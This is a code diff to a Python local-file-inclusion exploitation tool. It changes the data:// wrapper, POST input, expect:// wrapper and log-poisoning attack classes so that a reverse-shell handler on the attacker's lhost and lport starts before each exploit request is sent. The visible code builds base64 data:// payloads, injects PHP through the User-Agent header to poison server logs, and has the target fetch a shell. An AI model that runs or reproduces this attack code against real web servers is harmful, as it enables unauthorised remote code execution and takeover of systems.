@@ -80,6 +80,9 @@ class Data:
             data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
             lfi = self.target + data_wrapper
 
+            handle = Payload(lhost, lport, self.target, shell)
+            handle.handler()
+
             if self.nostager:
                 raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...")
             else:
@@ -96,9 +99,6 @@ class Data:
             try:
                 if data_request.status_code != 200:
                     print(t.red(" [!] ") + "Unexpected HTTP Response ")
-                else:
-                    handle = Payload(lhost, lport, self.target, shell)
-                    handle.handler()
             except requests.exceptions.RequestException as data_error:
                 print(t.red(" [!] ") + "HTTP Error: %s" % data_error)
 
@@ -161,14 +161,14 @@ class Input:
             print(t.green(" [*] ") + "Downloading Shell")
             progressbar()
 
+        handle = Payload(lhost, lport, self.target, shell)
+        handle.handler()
+
         # Try block for actual attack
         try:
             dr = requests.post(url, data=payload)
             if dr.status_code != 200:
                 print t.red(" [*] Unexpected HTTP Response ")
-            else:
-                handle = Payload(lhost, lport, self.target, shell)
-                handle.handler()
         except requests.exceptions.RequestException as input_error:
             print t.red(" [*] HTTP Error ") + str(input_error)
 
@@ -207,6 +207,9 @@ class Expect:
         else:
             print(t.green(" [*] ") + "Success!")
 
+        handle = Payload(lhost, lport, self.target, shell)
+        handle.handler()
+
         # Build payload
         if self.nostager:
             payload_file = open("/tmp/{0}.php".format(shell),"r")
@@ -225,9 +228,6 @@ class Expect:
             r = requests.get(lfi)
             if r.status_code != 200:
                 print(t.red(" [!] Unexpected HTTP Response "))
-            else:
-                handle = Payload(lhost, lport, self.target, shell)
-                handle.handler()
         except requests.exceptions.RequestException as expect_error:
             print t.red(" [!] HTTP Error ") (expect_error)
 
@@ -279,6 +279,9 @@ class Logs:
             progressbar()
         lfi = self.target + self.location
 
+        handle = Payload(lhost, lport, self.target, shell)
+        handle.handler()
+
         try:
             headers = {'User-Agent': payload}
             r = requests.get(lfi, headers=headers)
@@ -288,9 +291,6 @@ class Logs:
                 r = requests.get(lfi)  # pull down shell from poisoned logs
                 if r.status_code != 200:
                     print(t.red(" [!] Unexpected HTTP Response "))
-                else:
-                    handle = Payload(lhost, lport, self.target, shell)
-                    handle.handler()
         except requests.exceptions.RequestException as expect_error:
             print t.red(" [!] HTTP Error ")(expect_error)
 
